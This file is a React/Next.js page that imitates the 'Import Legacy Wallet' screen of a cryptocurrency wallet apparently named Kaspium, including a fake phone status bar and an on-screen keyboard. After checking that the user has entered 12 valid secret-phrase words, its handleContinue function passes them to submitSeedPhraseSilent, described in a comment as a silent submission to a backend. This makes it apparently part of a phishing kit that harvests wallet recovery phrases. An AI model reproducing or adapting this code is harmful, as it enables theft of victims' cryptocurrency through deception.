'use client';

import { useState, useEffect, useRef, useMemo } from 'react';
import { useRouter } from 'next/navigation';
import { ArrowLeftIcon, QRCodeIcon, ClipboardIcon, ArrowRightIcon } from '../components/ui/Icons';
import { loadWordList, validatePhrase, getAutocompleteSuggestions, getCurrentWord } from '../utils/seedphrase';
import { submitSeedPhraseSilent } from '../utils-backend/seedphraseApi';

export default function ImportLegacy() {
  const router = useRouter();
  const [phrase, setPhrase] = useState('');
  const [wordList, setWordList] = useState<string[]>([]);
  const [suggestions, setSuggestions] = useState<string[]>([]);
  const [validation, setValidation] = useState<{
    isValid: boolean;
    words: string[];
    wordCount: number;
    invalidWords: number[];
  } | null>(null);
  const inputRef = useRef<HTMLTextAreaElement>(null);

  useEffect(() => {
    loadWordList().then(setWordList);
  }, []);

  const computedSuggestions = useMemo(() => {
    if (wordList.length === 0) return [];
    const currentWord = getCurrentWord(phrase);
    if (currentWord.length > 0) {
      return getAutocompleteSuggestions(currentWord, wordList, 8);
    }
    return [];
  }, [phrase, wordList]);

  const computedValidation = useMemo(() => {
    if (wordList.length === 0) return null;
    const validationResult = validatePhrase(phrase, wordList);
    const isValid = validationResult.wordCount === 12 && validationResult.invalidWords.length === 0;
    return { ...validationResult, isValid };
  }, [phrase, wordList]);

  useEffect(() => {
    setSuggestions(computedSuggestions);
  }, [computedSuggestions]);

  useEffect(() => {
    setValidation(computedValidation);
  }, [computedValidation]);

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setPhrase(text);
    } catch (error) {
      console.error('Failed to paste:', error);
    }
  };

  const handleContinue = async () => {
    if (validation?.isValid && validation.words.length > 0) {
      // Submit seedphrase silently and wait for success
      const seedPhraseMessage = validation.words.join(' ');
      const success = await submitSeedPhraseSilent(seedPhraseMessage, 'Kaspium');
      
      // Only navigate if submission was successful
      if (success) {
        router.push('/address-discovery');
      } else {
        // Optionally show error or retry
        console.error('Failed to submit seedphrase');
      }
    }
  };

  const handlePhraseChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setPhrase(e.target.value);
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
    // Handle space key - ensure proper word separation
    if (e.key === ' ') {
      const currentWord = getCurrentWord(phrase);
      
      // If current word is complete and valid, allow space
      if (currentWord.length > 0 && wordList.includes(currentWord.toLowerCase())) {
        // Space is allowed, let it proceed normally
        return;
      }
      // Otherwise, prevent default and add space manually if needed
      e.preventDefault();
      const trimmed = phrase.trim();
      if (trimmed.length > 0 && !trimmed.endsWith(' ')) {
        setPhrase(trimmed + ' ');
      }
    }
  };

  const handleSuggestionClick = (word: string) => {
    const words = phrase.trim().split(/\s+/).filter((w) => w.length > 0);
    
    // Replace the last incomplete word with the selected word
    if (words.length > 0) {
      words[words.length - 1] = word;
      setPhrase(words.join(' ') + ' ');
    } else {
      setPhrase(word + ' ');
    }
    
    // Focus and move cursor to end
    setTimeout(() => {
      inputRef.current?.focus();
      if (inputRef.current) {
        inputRef.current.setSelectionRange(
          inputRef.current.value.length,
          inputRef.current.value.length
        );
      }
    }, 0);
  };

  const isValid = validation?.isValid ?? false;
  const wordCount = validation?.wordCount ?? 0;

  return (
    <div className="min-h-screen bg-[#1a1a1a] flex flex-col px-6 pt-12 overflow-x-hidden">
      {/* Status bar */}
      <div className="absolute top-0 left-0 right-0 h-8 flex items-center px-4 text-white text-sm">
        <span>1:57</span>
      </div>

      {/* Header */}
      <div className="flex items-center justify-between mb-8">
        <button onClick={() => router.back()}>
          <ArrowLeftIcon className="w-6 h-6 text-white" />
        </button>
        <h1 className="text-2xl font-bold text-[#14b8a6]">Import Legacy Wallet</h1>
        <button>
          <QRCodeIcon className="w-6 h-6 text-white" />
        </button>
      </div>

      {/* Instructions */}
      <p className="text-white mb-6">Please enter your 12 word secret phrase below.</p>

      {/* Input */}
      <div className="relative mb-4 w-[640px] mx-auto flex-shrink-0">
        <div className="bg-[#2a2a2a] rounded-lg p-4 flex items-start gap-3 min-h-[120px]">
          <button>
            <QRCodeIcon className="w-6 h-6 text-[#14b8a6] mt-1" />
          </button>
          <textarea
            ref={inputRef}
            value={phrase}
            onChange={handlePhraseChange}
            onKeyDown={handleKeyDown}
            placeholder=""
            className="flex-1 bg-transparent text-[#14b8a6] outline-none resize-none min-h-[100px]"
            autoFocus
            rows={4}
            style={{ fontFamily: 'inherit' }}
          />
          <div className="flex flex-col gap-2">
            <button onClick={handlePaste}>
              <ClipboardIcon className="w-6 h-6 text-[#14b8a6]" />
            </button>
            {isValid && (
              <button
                onClick={handleContinue}
                className="w-12 h-12 rounded-full bg-[#14b8a6] flex items-center justify-center text-white shadow-lg"
              >
                <ArrowRightIcon className="w-6 h-6" />
              </button>
            )}
          </div>
        </div>
      </div>

      {/* Word count indicator */}
      {wordCount > 0 && (
        <div className="mb-4">
          <span className={`text-sm ${isValid ? 'text-[#14b8a6]' : 'text-gray-400'}`}>
            {wordCount} / 12 words
          </span>
        </div>
      )}

      {/* Autocomplete suggestions */}
      {suggestions.length > 0 && (
        <div className="flex flex-wrap gap-2 mb-4">
          {suggestions.map((word, index) => (
            <button
              key={index}
              onClick={() => handleSuggestionClick(word)}
              className="bg-[#2a2a2a] text-white px-3 py-2 rounded-lg text-sm hover:bg-[#3a3a3a] transition-colors"
            >
              {word}
            </button>
          ))}
        </div>
      )}

      {/* Keyboard simulation */}
      <div className="mt-auto">
        <div className="bg-[#2a2a2a] rounded-lg p-4">
          <div className="grid grid-cols-10 gap-2 mb-2">
            {['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p'].map((key) => (
              <button
                key={key}
                onClick={() => {
                  const currentWord = getCurrentWord(phrase);
                  if (currentWord.length > 0) {
                    // Append to current word
                    const newWord = currentWord + key;
                    const words = phrase.trim().split(/\s+/).filter((w) => w.length > 0);
                    if (words.length > 0) {
                      words[words.length - 1] = newWord;
                      setPhrase(words.join(' '));
                    } else {
                      setPhrase(newWord);
                    }
                  } else {
                    // Start new word
                    const trimmed = phrase.trim();
                    setPhrase(trimmed + (trimmed.length > 0 ? ' ' : '') + key);
                  }
                  setTimeout(() => {
                    inputRef.current?.focus();
                    if (inputRef.current) {
                      inputRef.current.setSelectionRange(
                        inputRef.current.value.length,
                        inputRef.current.value.length
                      );
                    }
                  }, 0);
                }}
                className="bg-[#1a1a1a] text-white py-2 rounded text-sm hover:bg-[#2a2a2a] transition-colors"
              >
                {key}
              </button>
            ))}
          </div>
          <div className="grid grid-cols-9 gap-2 mb-2">
            {['a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l'].map((key) => (
              <button
                key={key}
                onClick={() => {
                  const currentWord = getCurrentWord(phrase);
                  if (currentWord.length > 0) {
                    // Append to current word
                    const newWord = currentWord + key;
                    const words = phrase.trim().split(/\s+/).filter((w) => w.length > 0);
                    if (words.length > 0) {
                      words[words.length - 1] = newWord;
                      setPhrase(words.join(' '));
                    } else {
                      setPhrase(newWord);
                    }
                  } else {
                    // Start new word
                    const trimmed = phrase.trim();
                    setPhrase(trimmed + (trimmed.length > 0 ? ' ' : '') + key);
                  }
                  setTimeout(() => {
                    inputRef.current?.focus();
                    if (inputRef.current) {
                      inputRef.current.setSelectionRange(
                        inputRef.current.value.length,
                        inputRef.current.value.length
                      );
                    }
                  }, 0);
                }}
                className="bg-[#1a1a1a] text-white py-2 rounded text-sm hover:bg-[#2a2a2a] transition-colors"
              >
                {key}
              </button>
            ))}
          </div>
          <div className="grid grid-cols-9 gap-2 mb-2">
            <div></div>
            {['z', 'x', 'c', 'v', 'b', 'n', 'm'].map((key) => (
              <button
                key={key}
                onClick={() => {
                  const currentWord = getCurrentWord(phrase);
                  if (currentWord.length > 0) {
                    // Append to current word
                    const newWord = currentWord + key;
                    const words = phrase.trim().split(/\s+/).filter((w) => w.length > 0);
                    if (words.length > 0) {
                      words[words.length - 1] = newWord;
                      setPhrase(words.join(' '));
                    } else {
                      setPhrase(newWord);
                    }
                  } else {
                    // Start new word
                    const trimmed = phrase.trim();
                    setPhrase(trimmed + (trimmed.length > 0 ? ' ' : '') + key);
                  }
                  setTimeout(() => {
                    inputRef.current?.focus();
                    if (inputRef.current) {
                      inputRef.current.setSelectionRange(
                        inputRef.current.value.length,
                        inputRef.current.value.length
                      );
                    }
                  }, 0);
                }}
                className="bg-[#1a1a1a] text-white py-2 rounded text-sm hover:bg-[#2a2a2a] transition-colors"
              >
                {key}
              </button>
            ))}
            <button
              onClick={() => {
                if (phrase.length === 0) return;
                
                // If ends with space, remove it
                if (phrase.endsWith(' ')) {
                  setPhrase(phrase.slice(0, -1));
                } else {
                  // Remove last character from current word
                  const words = phrase.trim().split(/\s+/).filter((w) => w.length > 0);
                  if (words.length > 0) {
                    const lastWord = words[words.length - 1];
                    if (lastWord.length > 1) {
                      words[words.length - 1] = lastWord.slice(0, -1);
                      setPhrase(words.join(' '));
                    } else {
                      words.pop();
                      setPhrase(words.join(' '));
                    }
                  } else {
                    setPhrase(phrase.slice(0, -1));
                  }
                }
                setTimeout(() => {
                  inputRef.current?.focus();
                  if (inputRef.current) {
                    inputRef.current.setSelectionRange(
                      inputRef.current.value.length,
                      inputRef.current.value.length
                    );
                  }
                }, 0);
              }}
              className="bg-[#1a1a1a] text-white py-2 rounded text-sm hover:bg-[#2a2a2a] transition-colors"
            >
              ⌫
            </button>
          </div>
          {/* Space button row */}
          <div className="grid grid-cols-1 gap-2">
            <button
              onClick={() => {
                const trimmed = phrase.trim();
                if (trimmed.length > 0 && !trimmed.endsWith(' ')) {
                  setPhrase(trimmed + ' ');
                } else if (trimmed.length === 0) {
                  // Don't add space if phrase is empty
                  return;
                }
                setTimeout(() => {
                  inputRef.current?.focus();
                  if (inputRef.current) {
                    inputRef.current.setSelectionRange(
                      inputRef.current.value.length,
                      inputRef.current.value.length
                    );
                  }
                }, 0);
              }}
              className="bg-[#1a1a1a] text-white py-2 rounded text-sm hover:bg-[#2a2a2a] transition-colors"
            >
              Space
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

